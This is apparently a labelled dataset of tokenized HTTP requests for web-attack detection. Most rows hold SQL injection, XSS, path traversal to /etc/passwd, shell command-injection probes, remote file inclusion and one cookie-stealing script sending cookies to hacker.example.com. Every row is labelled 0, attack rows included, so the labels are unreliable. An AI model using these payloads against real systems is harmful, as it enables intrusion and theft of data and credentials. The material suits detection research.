sentences 	 labels
/ examples / jsp / sessions / directorypro . cgi ? want = showcat & show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / modo = registro & login = derosenr & password = abarracar & nombre = tristn & apellidos = pol + lazcano & email = braverman-watkin @ docerosas . pl & dni = 28010640k & direccion = c /  + antoni + rosello + i + nadal + 172 +  & ciudad = blancafort & cp = 50522 & provincia = burgos & ntc = 7871877495462595bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = registrar  \r\n\r\n 	 0
/ g8nu2yy7 . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = < script > document . cookie =  " testviqu = 1270 ;  "  <  / script >  \r\n\r\n 	 0
/ m2fpztty . asp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = &  & echo $ ifszayxmz $  (  ( 3 + 83 )  )  $  ( echo $ ifszayxmz ) zayxmz |  \r\n\r\n 	 0
/ string / str =  $  ( echo gqpjfy )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 0
/ en-us / i686v90l . php3 ?  < meta http-equiv = set-cookie content =  " testfutf = 1550 "  >  \r\n\r\n 	 0
/ string / modo = registro & login = jeri & password = 8n6s17d741a49e & nombre = eutimio & apellidos = zamudio & email = bannen @ masqueclases . ch & dni = 98531799y & direccion = geologo + palacios ,  + 134 ,  + 13 ? b & ciudad = puigverd + de + lleida & cpa = 09560 & provincia = teruel & ntc = 3173800761137477 & b1 = registrar  \r\n\r\n 	 0
/ cgi-bin / index . php ? include_files [  ]  =  & include_files [ query_string ]  =  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = -6616 )  order by 1 --  \r\n\r\n 	 0
/ ybz5rz7a . fts ?  < meta http-equiv = set-cookie content =  " testsbvw = 6289 "  >  \r\n\r\n 	 0
/ string / strings / parameters = "  "  <  / style >  < img src = x onerror = alert ( 1 )  /  /  "  "  >  \r\n\r\n 	 0
/ string / strings / parameters = < a href =  "  \ xe2 \ x80 \ x8ajavascript : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  \r\n\r\n 	 0
/  .  .  /  .  .  /  .  .  /  .  .  / winnt / repair / sam . _  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  where 6686 = 6686 or elt ( 6272 = 6272 , sleep ( 5 )  )  --  \r\n\r\n 	 0
/ help . php ? q =  " ping \ x09-w \ x097000 \ x09-n \ x091 \ x091 . 2 . 3 . 4 & rem \ x09  \r\n\r\n 	 0
/ main . php ? frm_daynight = q45634966 & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 24 . 202 / main . php & frm_user =  & scr_height =  & scr_width =  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  or char ( 117 )  |  | char ( 111 )  |  | char ( 105 )  |  | char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  (  ' aovy '  =  ' aovy  \r\n\r\n 	 0
/ psynch / nph-psf . exe ? css = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  \r\n\r\n 	 0
/ ygkjkngd . asp ?  < meta http-equiv = set-cookie content =  " testnago = 4518 "  >  \r\n\r\n 	 0
/ string / strings / parameters = '   str =  $  ( echo bxlxvp )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  \r\n\r\n 	 0
/ edv3mapy . htm ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = -7648 '  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  \r\n\r\n 	 0
/ vac1l5vm . cfc ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = '  |  | echo $ ifsswpmae $  (  ( 92 + 33 )  )  $  ( echo $ ifsswpmae ) swpmae \  \  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  union all select null , null --  \r\n\r\n 	 0
/ pxagj7n7 . x ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ javascript / library . exe  \r\n\r\n 	 0
/ uvazfs7p . kspx ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  \r\n\r\n 	 0
/ string / modo = entrar & login = ohio & pwd = e25299a ' rs , e & remember = off & b1 = entrar  \r\n\r\n 	 0
/ string / modo = entrarset-cookie :  + tamper = 1041264011025374727 & login = kuchinsk & pwd = rogadora & remember = off & b1 = entrar  \r\n\r\n 	 0
/ string / modo = registro & login = griggs3 & password = 49to9el0 & nombre = emanuel & apellidos = zinicola + cucurella & email = bergman @ pintandomucho . la & dni = 20437771v & direccion = calle + fray + lu * is + de + leon + 119 +  & ciudad = calcena & cp = 03580 & provincia = lleida & ntc = 4946393543787658 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  as nfpe where 2679 = 2679 ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  \r\n\r\n 	 0
/ string / modo = entrar & login = beehler & pwd = penetral & remember = off /  & b1 = entrar  \r\n\r\n 	 0
/ string / strings / parameters = ; echo muyisp $  (  ( 6 + 57 )  )  $  ( echo muyisp ) muyisp "  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  as gocb where 4335 = 4335 ; select case when 8227 = 1229 then 1 else null end --  \r\n\r\n 	 0
/ string / modo = insertar & precio = 1491 & b1 = pasar + por + caja /  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  +  ( select  ' pvej '  where 4496 = 4496 and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  )  +  '  \r\n\r\n 	 0
/ string / modo = registro & login = terrye & password = lombriguera & nombre = policarpa & apellidos = susanibar + nolla & email = kortner @ vitalhome . cl & dni = 40604241h & direccion = avda .  + del + municipi ,  + 45 ,  +  & ciudad = arona & cp = 19144 & provincia = mlaga & ntca = 4253633913747340 & b1 = registrar  \r\n\r\n 	 0
/ jujgxwav . pl ?  < script > document . cookie =  " testknim = 9383 ;  "  <  / script >  \r\n\r\n 	 0
/ main . php ? logout =  "  | ping \ x09-w \ x097000 \ x09-n \ x091 \ x091 . 2 . 3 . 4 | rem \ x09  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  union all select null , null , null #  \r\n\r\n 	 0
/ confirmunsubscription . php ? output = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  \r\n\r\n 	 0
/ string / modo = insertar & precio = 1510 <  !  --  # include + file =  " archivo_secreto "  +  --  >  & b1 = confirmar  \r\n\r\n 	 0
/ main . php ? logout =  & ver ,  > q27276952 & rem ,  \r\n\r\n 	 0
/ string / strings / parameters = order by 22 #  \r\n\r\n 	 0
/ examples / jsp / error / inc / functions . inc . php ? config [ ppa_root_path ]  =  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  union all select null #  \r\n\r\n 	 0
/ string / modo = registro & login = delly & password = barboquejo & nombre = celinda & apellidos = cusicanqui + lluch & email = treacy @ conac . com . bw & dni = 06685986r & direccion = c /  + poeta + miguel + hernandez ,  + 85 ,  + 13 ? c & ciudad = escorial ,  + el & cpa = 12300 & provincia = pontevedra & ntc = 3155444527951741 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = '  |   [  4 -ne  $  ( echo ldsbta  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  \r\n\r\n 	 0
/ examples / jsp / error / newsdesk . cgi ? t =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / id = 3 +  & nombre = queso + manchego & precio = 100 & cantidad = 75 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / modo = insertar & precio = 8318 & b1 = confirmar /  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  "  " ewsr "  "  like  "  " ewsr  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  as pobe where 1704 = 1704 ; begin dbms_lock . sleep ( 5 )  ;  end --  \r\n\r\n 	 0
/ examples / jsp / jsp2 / jspx / insertorder . cfm ? cfid = 1 & cftoken = 1 union select 1 , 2 , 3 , 4 , storename , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 from params " having 1 = 1  \r\n\r\n 	 0
/ main . php ? stuff =  "  & rm \ x09q95961944 & rem \ x09  \r\n\r\n 	 0
/ string / id = 1 & nombre = vino + rioja & precio = 39 |  & cantidad = 68 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / modo = registro & login = tobye & password = car40m20ci8 & nombre = amaro & apellidos = brunori & email = esham @ cpanelweb . com . bv & dni = 22205546n & direccion = avda .  + aldehuela ,  + 9 + 13-h & ciudad = torlengua & cp = 02510 & provincia = palencia & ntc = 5917432990420378 & b1 =  '  + and +  ' 1 '  =  ' 1  \r\n\r\n 	 0
/ javascript / subscriber . exe  \r\n\r\n 	 0
/ string / strings / parameters = "   str =  $  ( echo yqomci )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  \r\n\r\n 	 0
/ string / modo = registro & login = pezzullo & password = 3s3lavo3a & nombre = cipriana & apellidos = maza + de + lizana + busqueta & email = verstraete2 @ soyouthinkyoucandance . io & dni = 86251880v & direccion = calle + nuria ,  + 8 ,  +  & ciudad = castrillo-tejeriego & cp = 0913a & provincia = toledo & ntc = 7846720837144073 & b1 = registrar  \r\n\r\n 	 0
/ main . php ? stuff =  '  & del q97413885  #  \r\n\r\n 	 0
/ include / html / nettools . popup . php ? dir = xxpathxx  \r\n\r\n 	 0
/ 0rufe52p . cfc ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / modo = registro & login = willy & password = c53p7t25064 & nombre = aidano & apellidos = pujos + janeiro & email = eberle @ baybay . tg & dni = 85025185g & direccion = de + la + vega + 4 ,  +  & ciudad = casasimarro & cp = 21340 & provincia = a + corua & ntc = 7642131917731646 & b1a = registrar  \r\n\r\n 	 0
/ string / str =  $  ( echo uvfukr )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo tnpfba )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  \r\n\r\n 	 0
/ opensiteadmin / scripts / classes / fieldmanager . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / whmch8ftkt7kv ?  \ x00  \r\n\r\n 	 0
/ string / strings / parameters = <  !  [  >  < img src =  "  ]  >  < img src = x onerror = alert ( xss )  /  /  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  where 2235 = 2235 union all select null , null , null , null , null --  \r\n\r\n 	 0
/ string / strings / parameters = & lt ; script / src =  \  " http &  # 58 ;  /  / ha &  # 46 ; ckers &  # 46 ; org / xss &  # 46 ; js \  "  & gt ;  & lt ;  / script & gt ;  \r\n\r\n 	 0
/ web / lom . php ? etcdir = xxpathxx  \r\n\r\n 	 0
/ string / modo = insertar & precio = 6493 & b1 = pasar + por + caja /  \r\n\r\n 	 0
/ string / modo = registro & login = archy & password = 83 * 4r31l7 & nombre = jimy & apellidos = bassas + sancliment & email = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & dni = 75288361t & direccion = calle + versalles ,  + 58 +  & ciudad = bercero & cp = 50155 & provincia = zaragoza & ntc = 7133167729041285 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = & echo $ ifsgqpcye $  (  ( 3 + 64 )  )  $  ( echo $ ifsgqpcye ) gqpcye '  \r\n\r\n 	 0
/ opensiteadmin / scripts / classes / filters / singlefilter . php ? path = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  \ x00  \r\n\r\n 	 0
/ examples / jsp / checkbox / edit . jsp ? page = user & editor =  .  .  /  .  .  /  .  .  / install  \r\n\r\n 	 0
/ string / strings / parameters = -7008 '  )  )  union all select 9080 , 9080 , 9080 #  \r\n\r\n 	 0
/ string / id = 2any  set-cookie :  + tamper = 5765205567234876235  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  )  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  (  (  '  %  '  =  '  \r\n\r\n 	 0
/ string / strings / parameters = <  ? xml-stylesheet type =  " text / xsl "  href =  "  #  "   ?  >  < stylesheet xmlns =  " http :  /  / www . w3 . org / tr / wd-xsl "  >  < template match =  "  /  "  >  < eval > new activexobject (  & apos ; htmlfile & apos ;  )  . parentwindow . alert ( 1 )  <  / eval >  < if expr =  " new activexobject (  ' htmlfile '  )  . parentwindow . alert ( 2 )  "  >  <  / if >  <  / template >  <  / stylesheet >  \r\n\r\n 	 0
/ main . php ? stuff =  "  \ x0duname  > q12524199  #  \r\n\r\n 	 0
/ javascript /  . htaccess . sfish / skipfish :  /  / invalid /  ;  ?  \r\n\r\n 	 0
/ string / strings / parameters = < iframe /  \r\n\r\n 	 0
/ include / doc / get_image . php ? lang = en & img =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / modo = insertar & precio = 2293 & b1 = pasar + por + caja /  \r\n\r\n 	 0
/ string / strings / parameters = id \r\n\r\n 	 0
/ string / strings / parameters = -7404 '  where 1536 = 1536 order by 1 #  \r\n\r\n 	 0
/ string / modo = insertar & precio = 9499 & b1 = confirmar /  \r\n\r\n 	 0
/ string / modo = registro & login = korn & password = verbo & nombre = melitn & apellidos = ferr + menchen & email = kayser @ ajuntamentbcn20 . th & dni = 76646408n & direccion = glorieta + de + la + media + luna ,  + 146 ,  +  & ciudad = mocejn & cp = 45111 & provincia = castelln & ntc = 5404266058977380 & b1a = registrar  \r\n\r\n 	 0
/ y8pmygrp . php3 ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ news . php ? config [ script_path ]  = xxpathxx ?  \r\n\r\n 	 0
/ string / strings / parameters = '  & echo $ ifsdjqyup $  (  ( 21 + 12 )  )  $  ( echo $ ifsdjqyup ) djqyup /  /  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  +  ( select  ' lawc '  where 1171 = 1171 or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  \r\n\r\n 	 0
/ string / strings / parameters = "  "  ping . exe -n 31 127 . 0 . 0 . 1  \r\n\r\n 	 0
/ string / strings / parameters = '  )  )  and 0 = benchmark ( 3000000 , md5 ( 1 )  )   --  \r\n\r\n 	 0
/ main . php ? stuff =  & ver ,  > q86595211 & rem ,  \r\n\r\n 	 0
/ help . php ? q =  '  \ x0ddel q75815481  #  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  ; select benchmark ( 5000000 , md5 ( 0x4c4d6142 )  )  and  (  (  (  "  " bqfj "  "  like  "  " bqfj  \r\n\r\n 	 0
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 00 + ff + d0 + 89 + 44 + 24 + 24 + 5a + 93 + e8 + 10 + 00 + 00 + 00 + 61 + 5b + ff + e3 + 60 + 33 + c0 + b0 + 04 + e8 + 16 +  +  >  > ctdn  \r\n\r\n 	 0
/ examples / servlets / servlet / shopexd . asp ? catalogid =  ' 42  \r\n\r\n 	 0
/ string / modo = registro & login = kawaguch & password = corintio & nombre = b-arcar / i , o & apellidos = torrellas & email = felder @ thw-adm . cz & dni = 57023538y & direccion = pl .  + volta + 178 + 12 ? b & ciudad = castellote & cp = 46118 & provincia = teruel & ntc = 9801504936888930 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = echo $ ifsuytatz $  (  ( 65 + 69 )  )  $  ( echo $ ifsuytatz ) uytatz  \r\n\r\n 	 0
/ h5sc3gxy . cfc ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = ; echo raogcr $  (  ( 98 + 45 )  )  $  ( echo raogcr ) raogcr /  /  \r\n\r\n 	 0
/ template / vert / index . php ? pageall = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = '  )  , null , null )  waitfor delay  ' 0 : 0 : 20 '   --  \r\n\r\n 	 0
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 68 + 65 + 74 + 00 + 00 + 68 + 73 + 6f + 63 + 6b + 68 + 65 + 63 + 74 + 00 + 68 + 63 + 6f + 6e + 6e + 8b + dc + 53 + 51 + 83 +  +  >  > ctdn  \r\n\r\n 	 0
/ en-us / jnv890lt . do ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = "  | echo jumrwv $  (  ( 18 + 92 )  )  $  ( echo jumrwv ) jumrwv &  \r\n\r\n 	 0
/ ybz5rz7a . fts ?  < script > document . cookie =  " testsbvw = 6289 ;  "  <  / script >  \r\n\r\n 	 0
/ 9o6g5vkn . kspx ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / str =  $  ( echo zsoawg )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  \r\n\r\n 	 0
/ j734qobz . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ yacs / scripts / update_trailer . php ? context [ path_to_root ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ?  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  rlike sleep ( 5 )  and  (  ' boto '  =  ' boto  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo kwxvrq )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  \r\n\r\n 	 0
/ scripts / awstatstotals . php ? sort =  {  $  { phpinfo (  )  }  }  {  $  { exit (  )  }  }  \r\n\r\n 	 0
/ examples / jsp / jsp2 / jspx / print . php ? what = article & id =  '  \r\n\r\n 	 0
/ mpcgi / fileseek2 . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = ftp :  /  / 192 . 168 . 23 . 202 /  *  < apache_mod_proxy_ftp_glob_xss . nasl >  \r\n\r\n 	 0
/ examples / jsp / checkbox / login . php ? lang =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . txt  \r\n\r\n 	 0
/ 0 , 2997 , s = 1626 & amp ; a = 12703 , 00 /  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  where 9446 = 9446 union all select null #  \r\n\r\n 	 0
/ string / strings / parameters = < img src =  " jav & amp ;  # x09 ; ascript : alert (  ' xss '  )  ;  "  >  \r\n\r\n 	 0
/ string / modo = insertar & precio = 4926 & b1 = confirmar /  \r\n\r\n 	 0
/ topsitesdirectory / help . php ? sid =  & lt ; script & gt ; alert ( document . cookie )  & lt ;  / script & gt ;  \r\n\r\n 	 0
/ string / strings / parameters = echo mijfwa $  (  ( 64 + 47 )  )  $  ( echo mijfwa ) mijfwa &  \r\n\r\n 	 0
/ string / strings / parameters = -4347 '  union all select 6074 , 6074 , 6074 , 6074 , 6074 , 6074 , 6074 --  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  and 1661 = 1244 and  ' dcha '  =  ' dcha  \r\n\r\n 	 0
/ net_dns_path / dns / rr . php ? phpdns_basedir = xxpathxx ?  \r\n\r\n 	 0
/ examples / servlets / servlet / search / search . cgi ? keys =  *  & prc = any & catigory =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc  \r\n\r\n 	 0
/ string / strings / parameters = -2605 %  '  )  )  )  union all select 4738 , 4738 #  \r\n\r\n 	 0
/ top . php ? stuff =  & ver ,  > q82213421 & rem ,  \r\n\r\n 	 0
/ string / strings / parameters = -2715 '  )  )  union all select 8646 , 8646 , 8646 , 8646 , 8646 , 8646 , 8646 , 8646 --  \r\n\r\n 	 0
/ scripts / index . php ? src = 1 & _common = 1 & time = 1331908883 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / modo = registro & login = yarosh & password = es137z7ble & nombre = ian & apellidos = bardina + servi & email = alissa_macmillian @ soyandaluz . sl & dni = 28316047b & direccion = avda .  + conde + de + halcon ,  + 127 + 7 ? a & ciudad = moral + de + la + reina & cp = 49311 & provincia = lleida & ntc = 9933609390542119 |  & b1 = registrar  \r\n\r\n 	 0
/ byrg33fw . x ?  < meta http-equiv = set-cookie content =  " testexuu = 5340 "  >  \r\n\r\n 	 0
/ cgi-bin / htsearch . cgi ? words =  "  >  < script > alert %  ' vulnerable '  )  ;  <  / script >  \r\n\r\n 	 0
/ cgi-915 / sawmill ? rfcf +  " sawmillinfo / sawmillpassword "  + spbn + 1 , 1 , 21 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 + 3  \r\n\r\n 	 0
